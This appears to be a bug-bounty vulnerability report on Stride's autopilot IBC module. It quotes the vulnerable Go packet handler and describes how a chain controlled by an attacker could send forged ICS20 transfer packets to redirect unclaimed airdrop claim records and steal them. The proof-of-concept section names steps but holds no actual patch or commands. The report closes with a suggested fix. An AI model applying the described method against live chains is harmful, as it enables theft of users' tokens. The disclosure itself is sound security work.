# Stride IBC integration bug

## Summary

Activities on Stride are incentivised through airdrops. When an airdrop is created `utils.ConvertAddressToStrideAddress` is called on an allocations file to create a `ClaimRecord` for the airdrops. This normally works with no issues however for zones with different coin types, the stride address is incorrect. In this case, users first have to verify that they own the corresponding address eligible for the airdrop on another chain such as Evmos through an IBC enabled mechanism and then have the Stride address in the airdrop claim record updated to the one the user verifies.

However, due to several implementation issues, this mechanism can be exploited to modify the airdrop records of multiple accounts to an attacker address leading to a theft of all unclaimed airdrops. Almost 40k STRD out of the allocated 50k STRD from the recent EVMOS airdrop remains unclaimed. This leaves almost 80% of the allocated evmos airdrop susceptible to the airdrop theft. The overall value at risk could potentially be >1.6M STRD.

The airdrop update mechanism is implemented through the autopilot module which listens for incoming IBC transfers with a set memo field or invalid receiver field(this doubles as the memo field in versions of IBC lesser than v5).

```go
func (im IBCModule) OnRecvPacket(
	ctx sdk.Context,
	packet channeltypes.Packet,
	relayer sdk.AccAddress,
) ibcexported.Acknowledgement {
	im.keeper.Logger(ctx).Info(fmt.Sprintf("OnRecvPacket (autopilot): Sequence: %d, Source: %s, %s; Destination: %s, %s",
		packet.Sequence, packet.SourcePort, packet.SourceChannel, packet.DestinationPort, packet.DestinationChannel))

	// NOTE: acknowledgement will be written synchronously during IBC handler execution.
	var data transfertypes.FungibleTokenPacketData
	if err := transfertypes.ModuleCdc.UnmarshalJSON(packet.GetData(), &data); err != nil {
		return channeltypes.NewErrorAcknowledgement(err)
	}

	// Error any transactions with a Memo or Receiver field are greater than the max characters
	if len(data.Memo) > MaxMemoCharLength {
		return channeltypes.NewErrorAcknowledgement(errorsmod.Wrapf(types.ErrInvalidMemoSize, "memo length: %d", len(data.Memo)))
	}
	if len(data.Receiver) > MaxMemoCharLength {
		return channeltypes.NewErrorAcknowledgement(errorsmod.Wrapf(types.ErrInvalidMemoSize, "receiver length: %d", len(data.Receiver)))
	}

	// ibc-go v5 has a Memo field that can store forwarding info
	// For older version of ibc-go, the data must be stored in the receiver field
	var metadata string
	if data.Memo != "" { // ibc-go v5+
		metadata = data.Memo
	} else { // before ibc-go v5
		metadata = data.Receiver
	}

	// If a valid receiver address has been provided and no memo,
	// this is clearly just an normal IBC transfer
	// Pass down the stack immediately instead of parsing
	_, err := sdk.AccAddressFromBech32(data.Receiver)
	if err == nil && data.Memo == "" {
		return im.app.OnRecvPacket(ctx, packet, relayer)
	}

	// parse out any forwarding info
	packetForwardMetadata, err := types.ParsePacketMetadata(metadata)
	if err != nil {
		return channeltypes.NewErrorAcknowledgement(err)
	}

	// If the parsed metadata is nil, that means there is no forwarding logic
	// Pass the packet down to the next middleware
	if packetForwardMetadata == nil {
		return im.app.OnRecvPacket(ctx, packet, relayer)
	}

	// Modify the packet data by replacing the JSON metadata field with a receiver address
	// to allow the packet to continue down the stack
	newData := data
	newData.Receiver = packetForwardMetadata.Receiver
	bz, err := transfertypes.ModuleCdc.MarshalJSON(&newData)
	if err != nil {
		return channeltypes.NewErrorAcknowledgement(err)
	}
	newPacket := packet
	newPacket.Data = bz

	// Pass the new packet down the middleware stack first
	ack := im.app.OnRecvPacket(ctx, newPacket, relayer)
	if !ack.Success() {
		return ack
	}

	autopilotParams := im.keeper.GetParams(ctx)

	// If the transfer was successful, then route to the corresponding module, if applicable
	switch routingInfo := packetForwardMetadata.RoutingInfo.(type) {
	case types.StakeibcPacketMetadata:
		// If stakeibc routing is inactive (but the packet had routing info in the memo) return an ack error
		if !autopilotParams.StakeibcActive {
			im.keeper.Logger(ctx).Error(fmt.Sprintf("Packet from %s had stakeibc routing info but autopilot stakeibc routing is disabled", newData.Sender))
			return channeltypes.NewErrorAcknowledgement(types.ErrPacketForwardingInactive)
		}
		im.keeper.Logger(ctx).Info(fmt.Sprintf("Forwaring packet from %s to stakeibc", newData.Sender))

		// Try to liquid stake - return an ack error if it fails, otherwise return the ack generated from the earlier packet propogation
		if err := im.keeper.TryLiquidStaking(ctx, packet, newData, routingInfo); err != nil {
			im.keeper.Logger(ctx).Error(fmt.Sprintf("Error liquid staking packet from autopilot for %s: %s", newData.Sender, err.Error()))
			return channeltypes.NewErrorAcknowledgement(err)
		}

		return ack

	case types.ClaimPacketMetadata:
		// If claim routing is inactive (but the packet had routing info in the memo) return an ack error
		if !autopilotParams.ClaimActive {
			im.keeper.Logger(ctx).Error(fmt.Sprintf("Packet from %s had claim routing info but autopilot claim routing is disabled", newData.Sender))
			return channeltypes.NewErrorAcknowledgement(types.ErrPacketForwardingInactive)
		}
		im.keeper.Logger(ctx).Info(fmt.Sprintf("Forwaring packet from %s to claim", newData.Sender))

		if err := im.keeper.TryUpdateAirdropClaim(ctx, newData, routingInfo); err != nil {
			im.keeper.Logger(ctx).Error(fmt.Sprintf("Error updating airdrop claim from autopilot for %s: %s", newData.Sender, err.Error()))
			return channeltypes.NewErrorAcknowledgement(err)
		}

		return ack

	default:
		return channeltypes.NewErrorAcknowledgement(errorsmod.Wrapf(types.ErrUnsupportedAutopilotRoute, "%T", routingInfo))
	}
}
```

It then parses the metadata and routes to the `TryUpdateAirdropClaim` functionality below if the parsing succeeds. IBC is a permissionless protocol, meaning anyone can create a new IBC client on Stride to establish an IBC channel between Stride and a malicious attacker-controlled chain. Moreover, the fields in the incoming ICS20 `FungibleTokenPacketData` that trigger the transactions are fully controlled by the source chain and are not signed by the ICS20 sender account.

This means that a malicious IBC chain could easily update the airdrop address in the claim record of any account that is eligible for an airdrop and has not claimed it yet by creating a fake ICS20 transfer with the targeted account as the sender and recipient as the memo format required for updating the airdrop address. The attacker can update the claim record address to point to an address on Stride that is controlled by them and then claim the airdrop.

The attached proof-of-concept demonstrates the problem against a local Stride testnet and using [IBC solo machine](https://github.com/crypto-com/ibc-solo-machine) to create a malicious IBC client. The EVMOS airdrop is currently live and susceptible to this attack if executed on mainnet. Upcoming airdrops such as Luna and Injective will also be susceptible to this attack if it goes unfixed. It might also be possible for an attacker to claim unclaimed airdrops within the past 3 months.

Since there is seems to be no easy way to iterate over all the claim records to calculate the overall value at risk, we check the distributor balances to estimate the value at risk in the assumption that these are either unclaimed airdrops or set to be allocated for future airdrops as shown in the section below.


## Proof of Concept

* Apply the following patch to [ibc-solo-machine](https://github.com/crypto-com/ibc-solo-machine) to create a malicious IBC client.

* Trigger the autopilot module and update the claim record by sending an IBC transfer packet

# Attacker can now claim victim's airdrop
```

## Suggested Fix
Fixing this would require either a check to see if the incoming packet is from a trusted chain or adding some sort of signature verification to ensure the sender field from an IBC message can be trusted.  Since the particular solution is implemented for the evmos airdrop, checking if the IBC packet is from a whitelisted set of chains might also be a good idea. An immediate method to ensure there is no exploitation until the fix is applied would be to disable the address update mechanism by setting the `ClaimActive` parameter to `false`.
